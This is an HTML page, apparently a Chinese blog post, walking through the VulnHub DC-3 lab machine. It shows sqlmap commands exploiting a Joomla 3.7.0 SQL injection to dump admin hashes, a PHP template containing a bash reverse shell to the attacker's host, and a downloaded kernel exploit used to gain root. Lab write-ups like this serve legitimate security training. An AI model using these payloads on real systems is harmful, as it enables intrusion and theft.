@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>VulnHub通关日记-DC_3-Walkthrough | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub通关日记-DC_3-Walkthrough</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 27, 2020&nbsp;&nbsp;14:23:45</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h2><p>大家好，我是 <code>saulGoodman</code>，这篇文章是DC系列第三篇Walkthrough，总共有8篇，敬请期待！<br>下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-3,312/">https://www.vulnhub.com/entry/dc-3,312/</a><br>这次靶机只有一个 <code>Flag</code>，也就是在 <code>/root</code> 目录下的！所以我们要提升为 <code>root</code> 权限！</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机后的第一件事就是对它进行端口扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -T4 192.168.1.103</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1191.png" alt="图片"></p>
+<p>这边用 <code>NMAP</code> 扫描出来后发现它只开放了一个 <code>80</code> 端口，而且使用的 <code>CMS</code> 是 <code>Joomla</code>，这个 <code>CMS</code> 我之前完红日靶场遇到过一次。</p>
+<p>既然 <code>CMS</code> 是 <code>Joomla</code> 那么就使用它的扫描工具对它一顿梭哈吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl joomscan.pl -u http://192.168.1.103 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1192.png" alt="图片"></p>
+<p>扫描出来后我们得到了两个关键信息，也就是它的版本和它的网站后台地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">版本：Joomla 3.7.0</span><br><span class="line">后台地址 : http://192.168.1.103/administrator/</span><br></pre></td></tr></table></figure>
+
+<p>先访问它的首页发现了一段提示信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Welcome to DC-3.</span><br><span class="line"></span><br><span class="line">This time, there is only one flag, one entry point and no clues.</span><br><span class="line"></span><br><span class="line">To get the flag, you&#x27;ll obviously have to gain root privileges.</span><br><span class="line"></span><br><span class="line">How you get to be root is up to you - and, obviously, the system.</span><br><span class="line"></span><br><span class="line">Good luck - and I hope you enjoy this little challenge.  :-)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1193.png" alt="图片"></p>
+<p>大概的意思就是说这个靶场只有一个Flag，要让我们取得 root 权限！</p>
+<h2 id="Joomla-SQL-注入"><a href="#Joomla-SQL-注入" class="headerlink" title="Joomla SQL 注入"></a>Joomla SQL 注入</h2><p>既然是这样那么我首先是搜索了有关于 <code>Joomla 3.7.0</code> 的漏洞信息，看看能不能捡个漏</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1194.png" alt="图片"></p>
+<p>由上图可见，它这个版本有一个 <code>SQL</code> 注入！既然有注入那么就丢到 <code>Sqlmap</code> 一把梭：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.103/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1195.png" alt="图片"></p>
+<p>这边是注入出来了<code>五</code>个数据库，但是 <code>Joomla CMS</code> 默认的数据库为 <code>joomladb</code>，所以我们就直接跑这个数据库下的表把：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.1.103/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; <span class="comment">--risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">01</span>:<span class="number">08</span>:<span class="number">45</span>] [INFO] fetching tables <span class="keyword">for</span> database: <span class="string">&#x27;joomladb&#x27;</span></span><br><span class="line">[<span class="number">01</span>:<span class="number">08</span>:<span class="number">45</span>] [INFO] used <span class="keyword">SQL</span> query <span class="keyword">returns</span> <span class="number">91</span> entries</span><br><span class="line">Database: joomladb</span><br><span class="line">[<span class="number">76</span> tables]</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> #__assets           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__associations     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__banner_clients   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__banner_tracks    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__banners          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_admin       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_books       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_comments    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_locations   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_mediafiles  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_message_typ <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_podcast     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_series      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_servers     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_studies     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_studytopics <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_teachers    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_templatecod <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_templates   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_timeset     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_topics      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__bsms_update      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__categories       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__contact_details  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__content_frontpag <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__content_rating   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__content_types    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__content          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__contentitem_tag_ <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__core_log_searche <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__extensions       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__fields_categorie <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__fields_groups    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__fields_values    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__fields           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_filters   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_links_ter <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_links     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_taxonomy_ <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_taxonomy  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_terms_com <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_terms     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_tokens_ag <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_tokens    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__finder_types     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__jbsbackup_timese <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__jbspodcast_times <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__languages        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__menu_types       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__menu             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__messages_cfg     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__messages         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__modules_menu     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__modules          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__newsfeeds        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__overrider        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__postinstall_mess <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__redirect_links   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__schemas          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__session          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__tags             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__template_styles  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__ucm_base         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__ucm_content      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__ucm_history      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__update_sites_ext <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__update_sites     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__updates          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__user_keys        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__user_notes       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__user_profiles    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__user_usergroup_m <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__usergroups       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__users            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__utf8_conversion  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> #__viewlevels       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>跑出来的表有 <code>91</code> 条！但是我们只需要它后台管理员的用户那个表就好，接着我找到了一个为<code>#__users</code>的表，随后我开始注入它的列：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.1.103/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; <span class="comment">--risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; --columns</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Database: joomladb</span><br><span class="line"><span class="keyword">Table</span>: #__users</span><br><span class="line">[<span class="number">6</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>   <span class="operator">|</span> Type        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+</span></span><br><span class="line"><span class="operator">|</span> email    <span class="operator">|</span> non<span class="operator">-</span><span class="type">numeric</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> id       <span class="operator">|</span> <span class="type">numeric</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> non<span class="operator">-</span><span class="type">numeric</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> params   <span class="operator">|</span> non<span class="operator">-</span><span class="type">numeric</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> password <span class="operator">|</span> non<span class="operator">-</span><span class="type">numeric</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> non<span class="operator">-</span><span class="type">numeric</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>最后注入出它的 <code>username</code> 和 <code>password</code> 列的数据：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.1.103/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; <span class="comment">--risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; -C username,password --dump </span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1196.png" alt="图片"></p>
+<p>注入出来后得到了账号和一段加密的<code>hash</code>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> password                                                     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> admin    <span class="operator">|</span> $<span class="number">2</span>y$<span class="number">10</span>$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>一般来说这种加密需要用字典来撞，运气好就能得到它的明文！我是使用 <code>KALI</code> 自带的 <code>john</code> 来破解它的 <code>hash</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1197.png" alt="图片"></p>
+<p>因为我之前使用 <code>john</code> 破解过 <code>pass</code> 的 <code>hash</code>了，<code>john</code> 只会对同一个文件破解一次，所以我直接查看了上一次的爆破结果密码为：<code>snoopy</code>！</p>
+<h2 id="Joomla-Getshell"><a href="#Joomla-Getshell" class="headerlink" title="Joomla Getshell"></a>Joomla Getshell</h2><p>拿到密码后我登陆到了网站到后台：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103/administrator/index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1198.png" alt="图片"></p>
+<p>登陆到后台我来到了网站到模版处，添加了一个新的<code>php</code>页面，里面的代码是我们的反弹<code>shell</code>的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.128/4444 0&gt;&amp;1&#x27; &quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1199.png" alt="图片"></p>
+<p>这个时候 <code>KALI</code> 用 <code>nc</code> 监听 <code>4444</code>，我们访问 <code>saul.php</code> 这个文件成功得到一枚<code>shell</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.103/templates/beez3/saul.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1200.png" alt="图片"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>拿到<code>shell</code>只后我查看了一下内核版本发现系统是16年的 <code>Ubuntu</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1201.png" alt="图片"></p>
+<p>紧接着我搜索有关于这个版本的漏洞发现了一个提权漏洞：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1202.png" alt="图片"></p>
+<p>这是它的下载地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>
+
+<p>我把 <code>exp</code> 下载到本地只后，我 <code>KALI</code> 先是用 <code>python</code> 开启了一个简单的服务器用于靶机下载我们的 <code>exp</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1203.png" alt="图片"></p>
+<p>随后靶机用 <code>wget</code> 把我们的 <code>exp</code> 下载到靶机上：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1204.png" alt="图片"></p>
+<p>紧接着解压文件后，运行 <code>doubleput</code> 提权为 <code>root</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1205.png" alt="图片"></p>
+<p>最后也是在 <code>root</code> 目录下拿到了 <code>Flag</code>！</p>
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/02/27/Vulnhub-DC-3/">http://example.com/2020/02/27/Vulnhub-DC-3/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/02/29/Vulnhub-DC-4/">VulnHub通关日记-DC_4-Walkthrough</a>
+            
+            
+            <a class="next" rel="next" href="/2020/02/25/Vulnhub-Mr-Robot-1/">VulnHub通关日记-Mr-Robot-1-Walkthrough</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
